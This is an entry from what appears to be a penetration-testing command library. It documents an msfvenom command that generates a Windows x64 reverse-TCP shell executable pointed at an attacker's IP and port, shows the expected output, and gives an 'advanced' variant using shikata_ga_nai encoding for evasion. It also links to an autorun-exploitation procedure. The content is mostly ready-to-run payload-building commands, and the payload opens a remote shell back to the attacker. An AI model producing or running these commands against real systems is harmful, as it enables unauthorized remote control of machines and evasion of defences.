---
id: 5b8bf5cc-02cc-4c39-976d-c356d02a7565
name: msfvenom-generate-windows-x64-reverse-shell
type: command
executor: bash
data: >-
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$_ATTACKER_IP
  LPORT=$_ATTACKER_PORT -f exe -o $_PROGRAM.exe
output: >-
  root@kali:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.100
  LPORT=443 -f exe -o program.exe

  [-] No platform was selected, choosing Msf::Module::Platform::Windows from the
  payload

  [-] No arch selected, selecting arch: x64 from the payload

  No encoder or badchars specified, outputting raw payload

  Payload size: 460 bytes

  Final size of exe file: 7168 bytes

  Saved as: program.exe
created_at: '2020-03-30T21:59:32.816939+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - payload-generation
  - reverse-shell
verified: true
validated: true
---

# msfvenom-generate-windows-x64-reverse-shell

## Command

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$_ATTACKER_IP LPORT=$_ATTACKER_PORT -f exe -o $_PROGRAM.exe
```

## Description

This command uses msfvenom (from Metasploit) to generate a Windows x64 executable reverse TCP shell payload. It creates a standalone .exe file that connects back to the specified attacker IP and port upon execution, ideal for persistence or post-exploitation scenarios.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -p windows/x64/shell_reverse_tcp | Payload type: Windows x64 reverse TCP shell | Yes |
| LHOST=$_ATTACKER_IP | Attacker's listening IP address (e.g., 10.10.10.100) | Yes |
| LPORT=$_ATTACKER_PORT | Attacker's listening port (e.g., 443) | Yes |
| -f exe | Output format: Windows executable | Yes |
| -o $_PROGRAM.exe | Output filename (e.g., program.exe to match target) | Yes |

## Examples

### Basic Usage

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=443 -f exe -o shell.exe
```

### Advanced Usage

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=443 -e x86/shikata_ga_nai -i 3 -f exe -o encoded_shell.exe
```

(Adds encoding iterations for evasion.)

## Expected Output

Description of what output to expect when the command runs successfully.

```
root@kali:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=443 -f exe -o program.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: program.exe
```

The .exe file is created and ready for transfer.

## Related

- [[procedures/Exploit-Modifiable-Autorun-Program-on-Windows-Login]]
- [[commands/nc-create-listener]]
